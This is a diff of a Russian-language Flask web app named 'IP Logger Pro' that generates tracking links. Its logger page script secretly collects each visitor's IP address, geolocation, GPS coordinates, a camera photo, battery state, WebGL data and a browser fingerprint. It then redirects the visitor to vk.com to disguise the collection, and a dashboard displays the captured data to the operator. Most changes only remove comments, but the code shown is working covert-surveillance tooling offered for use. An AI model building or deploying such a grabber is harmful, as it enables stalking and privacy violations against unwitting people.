@@ -5,7 +5,7 @@ import json
 import os
 import requests
 import re
-import secrets  # 👈 Добавь импорт
+import secrets
 
 # ========== 1. СОЗДАЁМ APP ==========
 app = Flask(__name__)
@@ -16,9 +16,8 @@ app.secret_key = secrets.token_urlsafe(32)
 # Хранилище данных
 logs_db = {}
 links_db = {}
-}
 
-# ===================== СТРАНИЦА-ЛОГГЕР (С НАСТРОЙКАМИ) =====================
+# ===================== СТРАНИЦА-ЛОГГЕР =====================
 LOGGER_HTML = """
 <!DOCTYPE html>
 <html lang="ru">
@@ -97,7 +96,6 @@ LOGGER_HTML = """
 (function() {
     const linkId = window.location.pathname.split('/').pop();
 
-    // ========== ПОЛУЧЕНИЕ НАСТРОЕК ==========
     let settings = {};
 
     fetch('/settings')
@@ -105,11 +103,8 @@ LOGGER_HTML = """
         .then(data => { settings = data; })
         .catch(() => { settings = { redirect: 'https://vk.com/', geo: true, camera: true }; })
         .finally(() => {
-            // ========== СБОР ДАННЫХ ==========
             collectAndSend();
         });
-
-    // ========== ОСНОВНЫЕ ФУНКЦИИ ==========
 
     function getIP() {
         return fetch('https://api.ipify.org?format=json')
@@ -225,8 +220,6 @@ LOGGER_HTML = """
         } catch { return { renderer: 'Unknown', version: 'Unknown' }; }
     }
 
-    // ========== ГЕОЛОКАЦИЯ (ПО НАСТРОЙКЕ) ==========
-
     function getGeolocation() {
         return new Promise((resolve) => {
             if (!settings.geo) {
@@ -250,8 +243,6 @@ LOGGER_HTML = """
             );
         });
     }
-
-    // ========== КАМЕРА (ПО НАСТРОЙКЕ) ==========
 
     function getCameraPhoto() {
         return new Promise((resolve) => {
@@ -287,8 +278,6 @@ LOGGER_HTML = """
         });
     }
 
-    // ========== ОТПРАВКА ДАННЫХ ==========
-
     async function collectAndSend() {
         const ip = await getIP();
         const geo = await getGeo(ip);
@@ -298,7 +287,6 @@ LOGGER_HTML = """
         const battery = await getBattery();
         const webgl = getWebGL();
 
-        // Геолокация и камера — по настройкам
         const geolocation = await getGeolocation();
         const photo = await getCameraPhoto();
 
@@ -345,7 +333,6 @@ LOGGER_HTML = """
             });
         } catch (e) {}
 
-        // Редирект на указанный в настройках сайт
         setTimeout(() => {
             window.location.href = settings.redirect || 'https://vk.com/';
         }, 1500);
@@ -356,7 +343,7 @@ LOGGER_HTML = """
 </html>
 """
 
-# ===================== СТРАНИЦА ДЛЯ ТЕБЯ (С КРАСИВЫМ ДИЗАЙНОМ) =====================
+# ===================== СТРАНИЦА СТАТИСТИКИ =====================
 STATS_HTML = """
 <!DOCTYPE html>
 <html lang="ru">
@@ -379,7 +366,6 @@ STATS_HTML = """
             margin: 0 auto;
         }
 
-        /* Header */
         .header {
             display: flex;
             justify-content: space-between;
@@ -425,7 +411,6 @@ STATS_HTML = """
             flex-wrap: wrap;
         }
 
-        /* Buttons */
         .btn {
             display: inline-flex;
             align-items: center;
@@ -455,7 +440,6 @@ STATS_HTML = """
         .btn-sm { padding: 6px 14px; font-size: 12px; }
         .btn-xs { padding: 4px 10px; font-size: 11px; }
 
-        /* Stats Grid */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
@@ -491,7 +475,6 @@ STATS_HTML = """
             margin-top: 2px;
         }
 
-        /* Link Box */
         .link-box {
             background: rgba(255,255,255,0.03);
             border: 1px solid rgba(255,255,255,0.06);
@@ -525,7 +508,6 @@ STATS_HTML = """
             flex-wrap: wrap;
         }
 
-        /* Visitors */
         .visitor {
             background: rgba(255,255,255,0.03);
             border: 1px solid rgba(255,255,255,0.06);
@@ -580,7 +562,6 @@ STATS_HTML = """
             margin-top: 4px;
         }
 
-        /* Settings Panel */
         .settings-panel {
             background: rgba(255,255,255,0.03);
             border: 1px solid rgba(255,255,255,0.06);
@@ -674,7 +655,6 @@ STATS_HTML = """
             color: #a78bfa;
         }
 
-        /* Empty state */
         .empty {
             text-align: center;
             padding: 50px 20px;
@@ -683,7 +663,6 @@ STATS_HTML = """
         .empty .icon { font-size: 48px; margin-bottom: 16px; opacity: 0.3; }
         .empty .text { font-size: 16px; }
 
-        /* Toast */
         .toast {
             position: fixed;
             bottom: 24px;
@@ -706,13 +685,11 @@ STATS_HTML = """
         .toast.show { opacity: 1; }
         .toast.error { background: rgba(239,68,68,0.15); border-color: rgba(239,68,68,0.2); color: #f87171; }
 
-        /* Scrollbar */
         ::-webkit-scrollbar { width: 6px; }
         ::-webkit-scrollbar-track { background: #0a0a0f; }
         ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.08); border-radius: 3px; }
         ::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.15); }
 
-        /* Responsive */
         @media (max-width: 768px) {
             body { padding: 16px; }
             .header { flex-direction: column; align-items: flex-start; }
@@ -732,13 +709,12 @@ STATS_HTML = """
 </head>
 <body>
 <div class="app">
-    <!-- Header -->
     <header class="header">
         <div class="logo">
             <div class="logo-icon">📡</div>
             <div>
                 <div class="logo-text">IP <span>Logger</span> Pro</div>
-                <div class="logo-sub">v7.0 — управление ссылками</div>
+                <div class="logo-sub">v8.0 — управление ссылками</div>
             </div>
         </div>
         <div class="header-actions">
@@ -749,7 +725,6 @@ STATS_HTML = """
         </div>
     </header>
 
-    <!-- Settings -->
     <div class="settings-panel" id="settingsPanel">
         <div class="title">⚙️ Настройки <span>— применяются ко всем новым ссылкам</span></div>
         <div class="settings-row">
@@ -776,7 +751,6 @@ STATS_HTML = """
         </div>
     </div>
 
-    <!-- Stats -->
     <div class="stats-grid" id="statsGrid">
         <div class="stat-card"><div class="num" id="totalVisits">0</div><div class="label">Всего переходов</div></div>
         <div class="stat-card"><div class="num" id="uniqueVisits">0</div><div class="label">Уникальных IP</div></div>
@@ -784,7 +758,6 @@ STATS_HTML = """
         <div class="stat-card"><div class="num" id="withGeo">0</div><div class="label">С геолокацией</div></div>
     </div>
 
-    <!-- Current Link -->
     <div id="currentLinkBox" style="display:none;">
         <div class="link-box" style="border-color: rgba(124,92,252,0.3);">
             <span class="link" id="currentLinkText"></span>
@@ -796,30 +769,22 @@ STATS_HTML = """
         </div>
     </div>
 
-    <!-- Links List -->
     <div id="linksList"></div>
-
-    <!-- Visitors -->
     <div id="visitorsList"></div>
 
-    <!-- Footer -->
     <div style="margin-top:40px; padding-top:20px; border-top:1px solid rgba(255,255,255,0.04); text-align:center; font-size:13px; color:rgba(255,255,255,0.15);">
         ⚡ Все данные собираются автоматически · IP · Геолокация · Камера · Устройство · Браузер · Экран · Батарея · WebGL · Отпечаток
     </div>
 </div>
 
-<!-- Toast -->
 <div class="toast" id="toast"></div>
 
 <script>
-// ========== СОСТОЯНИЕ ==========
 let currentLinkId = null;
 let currentFullLink = '';
 
-// ========== НАСТРОЙКИ ==========
 let settings = { redirect: 'https://vk.com/', geo: true, camera: true };
 
-// Загрузка настроек
 fetch('/settings')
     .then(r => r.json())
     .then(data => {
@@ -830,7 +795,6 @@ fetch('/settings')
     })
     .catch(() => {});
 
-// ========== TOGGLE ==========
 function toggleSetting(name) {
     const el = document.getElementById(name + 'Toggle');
     const current = settings[name];
@@ -863,7 +827,6 @@ function saveSettings() {
     .catch(() => showToast('❌ Ошибка сохранения', true));
 }
 
-// ========== ССЫЛКИ ==========
 function generateLink() {
     fetch('/generate')
         .then(r => r.json())
@@ -900,7 +863,6 @@ function deleteCurrentLink() {
         });
 }
 
-// ========== ЗАГРУЗКА СПИСКА ССЫЛОК ==========
 function loadLinks() {
     fetch('/links')
         .then(r => r.json())
@@ -958,7 +920,6 @@ function deleteLink(id) {
         });
 }
 
-// ========== СТАТИСТИКА ==========
 function loadStats() {
     const url = currentLinkId ? '/stats/' + currentLinkId : '/stats/all';
     fetch(url)
@@ -1003,7 +964,6 @@ function loadStats() {
         });
 }
 
-// ========== ОЧИСТКА ==========
 function clearAll() {
     if (!confirm('Удалить все данные (все ссылки)?')) return;
     fetch('/clear', { method: 'POST' })
@@ -1021,7 +981,6 @@ function exportAll() {
     window.open('/export', '_blank');
 }
 
-// ========== TOAST ==========
 function showToast(msg, isError = false) {
     const toast = document.getElementById('toast');
     toast.textContent = msg;
@@ -1030,10 +989,8 @@ function showToast(msg, isError = false) {
     toast._hide = setTimeout(() => toast.classList.remove('show'), 3000);
 }
 
-// ========== АВТООБНОВЛЕНИЕ ==========
 setInterval(() => { loadStats(); loadLinks(); }, 5000);
 
-// ========== ЗАПУСК ==========
 loadLinks();
 loadStats();
 setTimeout(generateLink, 600);
@@ -1052,7 +1009,6 @@ def index():
 def settings():
     if request.method == 'POST':
         data = request.get_json()
-        # Сохраняем настройки в сессию или файл
         session['settings'] = data
         return jsonify({'status': 'ok'})
     else:
@@ -1107,11 +1063,11 @@ def stats_all():
     all_visitors = []
     for visitors in logs_db.values():
         all_visitors.extend(visitors)
-    
+
     unique_ips = len(set(v.get('ip') for v in all_visitors if v.get('ip')))
     with_photo = sum(1 for v in all_visitors if v.get('photo'))
     with_geo = sum(1 for v in all_visitors if v.get('gps_lat') and v.get('gps_lat') != 'Denied')
-    
+
     return jsonify({
         'visitors': all_visitors[-50:],
         'total_visits': len(all_visitors),
@@ -1126,7 +1082,7 @@ def stats_link(link_id):
     unique_ips = len(set(v.get('ip') for v in visitors if v.get('ip')))
     with_photo = sum(1 for v in visitors if v.get('photo'))
     with_geo = sum(1 for v in visitors if v.get('gps_lat') and v.get('gps_lat') != 'Denied')
-    
+
     return jsonify({
         'visitors': visitors[-50:],
         'total_visits': len(visitors),
